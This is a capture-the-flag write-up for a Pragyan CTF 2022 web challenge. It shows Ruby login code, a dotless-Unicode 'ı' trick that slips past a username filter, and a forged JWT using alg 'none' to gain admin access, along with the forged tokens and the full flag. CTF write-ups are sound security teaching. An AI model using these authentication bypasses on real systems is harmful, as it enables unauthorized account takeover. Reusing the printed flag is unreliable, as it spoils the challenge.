# Pragyan CTF 2022: Rails and JWT
## Write-Up

1) When you inspect the HTML code using browser dev tool, you will find a hint which emphasis on the term "ROBOT", which basically want us to view the robots.txt file.

2) When you check that route you will get the source code for authentication part, which is written in ruby.

```rb
    require 'sinatra/base'
    require 'sinatra'
    require "sinatra/cookies"

    get '/' do
        if request.cookies['auth']
            @user = getUsername()           # getUsername() - Method to get username from cookies 
            if @user.upcase == "MICHAEL"
                return erb :michael
            end
            return erb:index
        else
            return erb :index
        end
    end

    post '/login' do
        user = params['username'].to_s[0..20].strip
        password = params['password'].to_s[0..20]
        if user =~ /[A-Z]/ or user == 'michael'
            info = "Invalid Username/Password"
            return erb :login, :locals => {:info => info}

        elsif password == "whatever" and user.upcase == "MICHAEL"
            set_Cookies(user)

        else
            info = "Try login with michael's credential"
            return erb :login, :locals => {:info => info}
        end
        redirect '/'
    end
```

3) By reviewing this code we can get an idea about the login credentials which are basically 

```
    username: michael
    password: whatever
```

4) But here the "michael" username is filtered from the input. This we can be bypassed by making use of unicode "i".So, the new credentials will become 
```
    username: mıchael
    password: whatever
```

5) By providing these credentials, we can bypass that "if" statement and when these characters gets converted into uppercase it will automatically change as 
```
    username: MICHAEL
```
and that unicode "i" also gets converted to proper capital "I" .

6) Once you logged in, you will find the 1st half of the flag
```
    p_ctf{un1c0de_4nd
```

7) And now you need to get admin privilege, to find rest of the flag. For doing that you need to exploit the JWT token.
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJ1c2VyIjoibcSxY2hhZWwifQ.eXHXJZlQbME7lMLAnkGjqLhGFLXHuBD06mHMbaruqiM
```

8) On decrypting this you will get,
```
{"alg": "HS256","typ": "JWS"}.{"user": "mıchael"}.eXHXJZlQbME7lMLAnkGjqLhGFLXHuBD06mHMbaruqiM
```

9) On changing the "alg" part to "none", "user" part to "admin" and by removing the signature of the token we can able to bypass the authorization to admin.
The modified JWT token looks like
```
    {"alg":"none","typ":"JWS"}.{"user":"admin"}.
```
On encoding,
```
    eyJhbGciOiJub25lIiwidHlwIjoiSldTIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
```

10) Now when you inject your modified token in the cookies, you can able to login as admin and get the 2nd half of the flag 
```
    _j3t_m4kes_fu7}
```

### Flag for this challenge is 
```
    p_ctf{un1c0de_4nd_j3t_m4kes_fu7}
```